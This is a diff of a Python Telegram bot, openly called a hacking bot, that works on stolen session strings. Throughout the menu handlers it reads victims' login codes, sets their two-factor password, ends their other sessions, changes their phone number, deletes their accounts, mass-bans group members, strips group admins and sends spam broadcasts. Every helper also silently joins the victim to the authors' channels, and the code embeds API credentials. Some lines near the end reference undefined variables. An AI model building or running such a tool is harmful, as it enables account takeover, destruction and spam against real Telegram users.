@@ -1,15 +1,19 @@
 
+# COPYRIGHT © 2022 BY ANES/@N_B_1 🔥
+# NOW PUBLIC BY Anes
 import os
-os.system("pip install Telethon==1.21.1")
-from telethon import TelegramClient, events, functions, types
+os.system("pip install -U telethon")
+from telethon import TelegramClient, events, functions, types, Button
+from datetime import timedelta
+import asyncio
+
 api_id = os.environ.get("APP_ID")
-import os, asyncio
+import os, asyncio, re
 from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 api_hash = os.environ.get("API_HASH")
 token = os.environ.get("BOT_TOKEN")
-dev = os.environ.get("DEV")
-client = TelegramClient('ENG_MTR', api_id, api_hash).start(bot_token=token)
+client = TelegramClient('Arabihack', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -21,12 +25,29 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-ilyass = 5241356234
+Arabihack = 5502537272
 
+Bot_Username =os.environ.get("BOT_USERNAME", None) or "SessionHackingBot"
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
+    try:
+      await bot(join("Repthon"))
+    except BaseException:
+      pass
+    try:
+      await bot(join("QQQLO"))
+    except BaseException:
+      pass
+    try:
+      await bot(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await bot(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     try: 
       result = await bot(functions.account.ChangePhoneRequest(
         phone_number=number,
@@ -38,8 +59,24 @@ async def change_number_code(strses, number, code, otp):
       return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
+    try:
+      await bot(join("QQQLO"))
+    except BaseException:
+      pass
+    try:
+      await bot(join("Repthon"))
+    except BaseException:
+      pass
+    try:
+      await bot(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await bot(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     result = await bot(functions.account.SendChangePhoneCodeRequest(
         phone_number=number,
         settings=types.CodeSettings(
@@ -52,35 +89,128 @@ async def change_number(strses, number):
 
 
 async def userinfo(strses):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
+    try:
+      await X(join("QQQLO"))
+    except BaseException:
+      pass
+    try:
+      await X(join("Repthon"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     return str(k)
 
 async def terminate(strses):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      await X(join("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@N_B_10"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     await X(rt())
+
 GROUP_LIST = []
 async def delacc(strses):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
-    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      await X(join("@Ids_Holder"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@BestiesWorld"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    await X(functions.account.DeleteAccountRequest("I am chutia"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      await X(join("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@N_B_10"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
     except:
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def user2fa(strses):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X.edit_2fa('LEGENDXISBEST')
+      await X(join("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@N_B_10"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    try:
+      await X.edit_2fa('IndianHack IS BEST')
       return True
     except:
       return False
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      await X(join("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@N_B_10"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
         await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
@@ -90,29 +220,94 @@ async def demall(strses, grp):
 
 
 async def joingroup(strses, username):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      await X(join("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@N_B_10"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     await X(join(username))
 
+
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      await X(join("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@N_B_10"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     await X(leave(username))
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      await X(join("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@N_B_10"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     await X(dc(username))
     
 
 async def cu(strses):
   try:
-    async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         k = await X.get_me()
         return [str(k.first_name), str(k.username or k.id)]
   except Exception as e:
     return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     i = ""
+    try:
+      await X(join("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Repthon"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     async for x in X.iter_messages(777000, limit=3):
       i += f"\n{x.text}\n"
     await client.delete_dialog(777000)
@@ -120,7 +315,23 @@ async def usermsgs(strses):
 
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      await X(join("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@N_B_10"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     k = await X.get_participants(grp)
     for x in k:
       try:
@@ -131,12 +342,28 @@ async def userbans(strses, grp):
 
 
 async def userchannels(strses):
-  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      await X(join("@IndianSupportGroup"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@N_B_10"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
     k = await X(pc())
     i = ""
     for x in k.chats:
       try:
-        i += f'\n▾∮ اسم القنـاة {x.title} - معرف القنـاة @{x.username}\n'
+        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
       except:
         pass
     return str(i)
@@ -146,253 +373,563 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "R125R"
+channel = "Repthon"
 menu = '''
 
-A :  ** تحقق من قنوات ومجموعات الحساب **
+"A" :~ [معرفه قنوات/كروبات التي يملكها]
 
-B : ** اضهار معلومات الحساب كالرقم والايدي والاسم....الخ**
+"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
 
-C : ** لـحظر جميع اعضاء مجموعة معينة**
+"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
 
-D : ** تسجيل الدخول الى حساب المستخدم **
+"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
 
-E : ** اشتراك بقناة معينة** 
+"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس] 
 
-F : ** مغادرة قناة معينة **
+"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]
 
-G : ** حذف قناة او مجموعة **
+"G" :~][مسح كروب /قناه عن عن طريق كود ترمكس]
 
-H : ** التحقق اذا كان التحقق بخطوتين مفعل ام لا **
+"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]
 
-I : ** تسجيل الخروج من جميع الجلسات عدا جلسة البوت **
+"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]
 
-J : ** حذف الحساب نهائيا**
+"J" :~ [حذف الحساب]
 
-K : ** تنزيل جميع المشرفين من مجموعة معينة او قناة **
+"K" :~ [حذف جميع المشرفين في كروب/قناه]
 
-L : ** رفع مشرف لشخص معين في قناة او مجموعة **
+"L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]
 
-M : ** تغيير رقم الهاتف  **
+"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
 
-** مميزات اكثر قريبا @R125R ** 
- المبرمج: @KFFF6
+المطور: @ZQ_LO 👁️
+قناة المطور: @Repthon ⚠️
 '''
 mm = '''
-** اهلا بك في بوت الاختراق  يمكنك اختراق اي شخص عبر كود تيرمكس
 
-- اضغط على  /IQ
-**
 '''
+
+keyboard = [
+  [  
+    Button.inline("A", data="A"), 
+    Button.inline("B", data="B"),
+    Button.inline("C", data="C"),
+    Button.inline("D", data="D"),
+    Button.inline("E", data="E")
+    ],
+  [
+    Button.inline("F", data="F"), 
+    Button.inline("G", data="G"),
+    Button.inline("H", data="H"),
+    Button.inline("I", data="I"),
+    Button.inline("J", data="J"),
+    ],
+  [
+    Button.inline("K", data="K"), 
+    Button.inline("L", data="L"),
+    Button.inline("M", data="M"),
+    Button.inline("N", data="N"),
+    ],
+  [
+    Button.url("المطور", "https://t.me/ZQ_LO")
+    ]
+]
+
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
   global mm
   if not event.is_private:
-    await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
+    IndianHack = [
+      [
+        Button.url("اضغط هنا", f"https://t.me/{Bot_Username}?start=hack")
+        ]
+      ]         
+    await event.reply("اضغط هنا لاستخدامي", buttons=Arabihack)
   else:
-    await event.reply(mm)
-@client.on(events.NewMessage(pattern="/give"))
+  
+    await event.reply(" الضغط على~ /hack", buttons=legendbye)
+    
+       
+@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
 async def op(event):
-  if not event.sender_id == ilyass:
-    return await event.reply("@jepthon")
-  async for x in client.iter_messages("Hajarlx"):
-    try:
-      await x.forward_to("Hajarlx")
-    except:
-      pass
-
-
-@client.on(events.NewMessage(pattern="/IQ", func=lambda x: x.is_group))
-async def op(event):
-  await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
-@client.on(events.NewMessage(pattern="/IQ", func = lambda x: x.is_private))
+  
+  await event.reply("اضغط هنا لاستخدامي", buttons=Arabihack)
+  
+@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message(f"▾∮ قـائمة اوامر البوت :\n{menu}")
-    res = await x.get_response()
-    r = res.text
-    if res.text == "A":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+    keyboard = [
+      [  
+        Button.inline("A", data="A"), 
+        Button.inline("B", data="B"),
+        Button.inline("C", data="C"),
+        Button.inline("D", data="D"),
+        Button.inline("E", data="E")
+        ],
+      [
+        Button.inline("F", data="F"), 
+        Button.inline("G", data="G"),
+        Button.inline("H", data="H"),
+        Button.inline("I", data="I"),
+        Button.inline("J", data="J")
+        ],
+      [
+        Button.inline("K", data="K"), 
+        Button.inline("L", data="L"),
+        Button.inline("M", data="M"),
+        Button.inline("N", data="N"),
+        ],
+      [
+        Button.url("المطور", "https://t.me/ZQ_LO")
+        ]
+    ]
+    await x.send_message(f"اختر ما تريد فعله معه الجلسه \n\n{menu}", buttons=keyboard)
+    
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n /hack", buttons=keyboard)
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.reply("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\n▾∮ المعلومات بواسطه بوت تيرمكس")
+        file.write(i + "\n\nDetails BY @ZQ_LO")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
-    elif res.text == "B":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+        await event.reply(i + "\n\nشكرا لك لاستخدامك البوت. \n/hack", buttons=keyboard)
+      
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل لي كود ترمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
+    i = await userinfo(strses.text)
+    await event.reply(i + "\n\nشكرا لك لاستخدامك البوت.\n/hack", buttons=keyboard)
+    
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل لي كود ترمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا", buttons=keyboard)
+    await x.send_message("ارسل لي معرف/ايدي الكروب/القناه")
+    grpid = await x.get_response()
+    await userbans(strses.text, grpid.text)
+    await event.reply("يتم حظر جميع اعضاء الكروب/القناه", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      i = await userinfo(strses.text)
-      await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
-    elif r == "C":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ حسنا الان ارسل معرف القناة او المجموعة")
-      grpid = await x.get_response()
-      await userbans(strses.text, grpid.text)
-      await event.reply("▾∮ تم حظر جميع الاعضاء بنجاح تم التفليش ياب ")
-    elif r == "D":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
-    elif r == "E":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await event.reply(i + "\n\nشكرا لك لاستخدامك البوت", buttons=keyboard)
+    
+      
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل لي كود ترمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+    await x.send_message("اعطني معرف/ايدي الكروب/القناه")
+    grpid = await x.get_response()
+    await joingroup(strses.text, grpid.text)
+    await event.reply("تم الانضمام الى الكروب/القناه", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+    await x.send_message("الان ارسل لي كود ترمكس")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if op:
+      pass
+    else:
+      return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+    await x.send_message("اعطني معرف/ايدي الكروب/القناه")
+    grpid = await x.get_response()
+    await leavegroup(strses.text, grpid.text)
+    await event.reply("لقد تم مغادره الكروب/القناه,", buttons=keyboard)
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ حسنا الان ارسل معرف القناة او المجموعة")
-      grpid = await x.get_response()
-      await joingroup(strses.text, grpid.text)
-      await event.reply("▾∮ تم الانضمام الى المجموعة او القناة بنجاح")
-    elif r == "F":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ حسنا الان ارسل معرف القناة او المجموعة")
-      grpid = await x.get_response()
-      await leavegroup(strses.text, grpid.text)
-      await event.reply("▾∮ تمت المغادرة بنجاح ")
-    elif r == "G":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ حسنا الان ارسل معرف القناة او المجموعة")
+        return await event.respond("لقد تم طرد الكود من الحساب مسبقا.", buttons=keyboard)
+      await x.send_message("اعطني معرف/ايدي كروب/قناه")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("▾∮ تم حذف القناه بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
-    elif r == "H":
-      await x.send_message("▾∮ ارسل كود تيرمكس ")
+      await event.reply("تم حذف الكروب/قناه //شكرا لاستخدامك البوت.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("لقد تم طرد الكود من الحساب مسبقا.", buttons=keyboard)
       i = await user2fa(strses.text)
       if i:
-        await event.reply("▾∮ هذا الشخص لم يقوم بوضع رمز تحقق بخطوتين يمكنك اختراقه بنجاح و سهولة \n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
+        await event.reply("الشخص لم يفعل تحقق بخطوتين يمكنك الدخول الى الحساب بكل سهوله باستخدامك الامر ( D ) \n\nشكرا لك لاستخدامك البوت.", buttons=keyboard)
       else:
-        await event.reply("▾∮ هذا الشخص مفعل رمز تحقق بخطوتين لا يمكن اختراقه لكن يمكنك حذف حسابه او استخدام اي امر اخر")
-    elif r == "I":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+        await event.reply("عذرا الشخص مفعل تحقق بخطوتين", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("▾∮ تم انهاء جميع الجلسات بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
-    elif res.text == "J":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await event.reply("تم انهاء جميع الجلسات شكرا لاستخدامك البوت.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
       i = await delacc(strses.text)
-      await event.reply("▾∮ تم حذف هذا الحساب بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
-    elif res.text == "L":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await event.reply("لقد تم حذف الحساب بنجاح.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ الان ارسل معرف او رابط القناه او المجموعة")
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+      await x.send_message("ارسل لي معرف/ايدي الكروب/القناه")
       grp = await x.get_response()
-      await x.send_message("▾∮ الان ارسل معرف المستخدم")
+      await x.send_message("الان ارسل لي المعرف")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("▾∮ تم رفعك مشرف بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت  اختراق تيرمكس")
-    elif res.text == "K":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await event.reply("سارفعك في الكروب/القناه🌚.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ الان ارسل معرف او رابط القناه او المجموعة")
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+      await x.send_message("الان ارسل لي معرف/ايدي الكروب/قناه")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("▾∮ يتم تنزيل جميع المشرفين تاكد بنفسك")
-    elif res.text == "M":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await event.reply("لقد تم حذف جميع مشرفين الكروب/القناه.", buttons=keyboard)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل لي كود ترمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
-      await x.send_message("▾∮ ارسل الرقم الذي تريد تحويل الحساب عليه \n▾∮ ملاحظة:  لا تستخدم رقم امريكي \n▾∮ اذا استخدمت رقم امريكي ما راح يوصلك كود تغيير الرقم")
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا", buttons=keyboard)
+      await x.send_message("اعطني رقم التي تريد تغير اليه\n[ملاحظه /لا تستخدم ارقام الوهميه]\n[اذا استخدمت الارقام الوهميه مراح تكدر تحصل الكود] ")
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
         await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
         await asyncio.sleep(20)
-        await x.send_message("▾∮ حسنا الان ارسل")
+        await x.send_message("الان ارسل لي كود هاش")
         phone_code_hash = (await x.get_response()).text
-        await x.send_message("▾∮ ارسل الان كود التحقق")
+        await x.send_message("الان ارسل لي الكود")
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("▾∮ تم تغيير الرقم بنجاح")
+          await event.respond("لقد تم تغير رقم الحساب بنجاح")
         else:
-          await event.respond("هناك شي خطا")
+          await event.respond("هناك خطأ ما حصل")
       except Exception as e:
-        await event.respond("**هنالك خطأ**\n" + str(e))
-
-    else:
-      await event.respond("▾∮ استخدم /IQ فقط")
+        await event.respond("ارسل المشكله الى لحلها- @ZQ_LO\n**LOGS**\n" + str(e))
 
 
 
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
+async def start(event):
+    keyboard = [
+      [  
+        Button.inline("a", data="a"), 
+        Button.inline("b", data="b"),
+        Button.inline("c", data="c"),
+        ],
+      [
+        Button.url("المالك", "https://t.me/ZQ_LO")
+        ]
+    ]
+    await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
 
 
+
+async def gcasta(strses, msg):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for aman in X.iter_dialogs():
+                chat = aman.id
+                try:
+                    await X.send_message(chat, tol, file=file)     
+                    if lol != -1001878403490:
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
+                        await X.send_message(chat, tol, file=file)
+                        await asyncio.sleep(60)
